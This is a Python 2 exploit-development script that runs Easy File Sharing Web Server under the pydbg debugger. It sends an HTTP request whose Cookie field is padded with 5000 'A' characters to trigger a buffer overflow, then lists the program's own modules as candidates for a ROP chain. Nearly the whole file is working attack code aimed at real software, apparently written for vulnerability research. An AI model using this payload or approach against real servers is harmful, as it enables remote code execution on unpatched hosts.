from pydbg import *
import threading
import sys
import time
import socket

import pefile

class Fuzzer(object):
	def __init__(self, exe_path):
		self.exe_path = exe_path
		self.pid = None
		self.dbg = None
		self.running = True
		
		self.dbgThread = threading.Thread(target=self.start_debugger)
		self.dbgThread.setDaemon(False)
		self.dbgThread.start()
		
		# Wait debugger start process
		while self.pid is None:
			time.sleep(1)
			
		self.monitorThread = threading.Thread(target=self.monitor_debugger)
		self.monitorThread.setDaemon(False)
		self.monitorThread.start()
			
	def monitor_debugger(self):
		while self.running:
			# isContinue = raw_input("[+] y/n")
			attack()
			system_dlls = self.dbg.system_dlls
			file_prefix = "\\".join(self.exe_path.split("\\")[1:-1])
			disk = self.exe_path[0:2]
			# print file_prefix
			self.ropModulesList = []
			
			step = 1
			print "[+] Step%d fetch execute file path prefix." % (step)
			print "[*] file pre_fix %s" % (file_prefix)
			print
			step += 1
			
			'''
				show all dll.
			'''
			'''
			print "system dll"
			for dll in system_dlls:
				print dll.path
			print
			
			for modules in self.dbg.enumerate_modules():
				print modules[0]
			print
			'''
			
			'''
				collect all modules that don't belongs system.
			'''
			print "[+] Step%d append dll with file_prefix" % (step)
			for dll in system_dlls:
				if file_prefix in dll.path:
					print "[*] Append %s"  % (disk + dll.path)
					self.ropModulesList.append(disk + dll.path)
			print
			step += 1
			
			print "[+] Step%d append with not in system dll" % (step)
			for module in self.dbg.enumerate_modules():
				if ".exe" in module[0]:
					print "[*] Append %s" % (disk + "\\" + file_prefix + "\\" + module[0])
					self.ropModulesList.append(disk + "\\" + file_prefix + "\\" + module[0])
			print
			step += 1
			
			print "[+] Step%d check Rop modules can be used" % (step)
			for module in self.ropModulesList:
				try:
					f = open(module, "rb")
					f.close()
					print "[*] Open", module, "success."
				except Exception as e:
					print "[*] Open", module ,"fail."
					print "[*] Remove module %s" % (module)
					# print str(e)
			print
			step += 1
			
			# stop debugger running
			self.running = False
			
		# close debugger
		self.dbg.terminate_process()
			
		
	'''
		Try to start debugger and run it.
	'''
	def start_debugger(self):
		try:
			self.dbg = pydbg()
			self.dbg.load(self.exe_path)
			self.pid = self.dbg.pid
		except pdx:
			print "[+] Can't open file, please check file path"
			sys.exit(1)
		except Exception as e:
			print "[+] Unknow error: ", str(e)
			sys.exit(1)
		
		self.dbg.run()
		
		
def attack():
	time.sleep(5)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	host, port = "127.0.0.1", 80
	s.connect((host, port))
	payload = "A" * 5000
	http_req = ( "User-Agent: Mozilla/4.0\r\n"
                 "Host:" + host + ":" + str(port) + "\r\n"
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                 "Accept-Language: en-us\r\n"
                 "Accept-Encoding: gzip, deflate\r\n"
                 "Referer: http://" + host + "/\r\n"
                 "Cookie: SESSIONID=6771; UserID=;" + payload + " "
                 "PassWD=;\r\n"
                 "Conection: Keep-Alive\r\n\r\n"
                 )
	s.send(http_req)
	s.close()
		
exe_path = "D:\\testPoc\\Easy File Sharing Web Server\\fsws.exe"
fuzzer = Fuzzer(exe_path)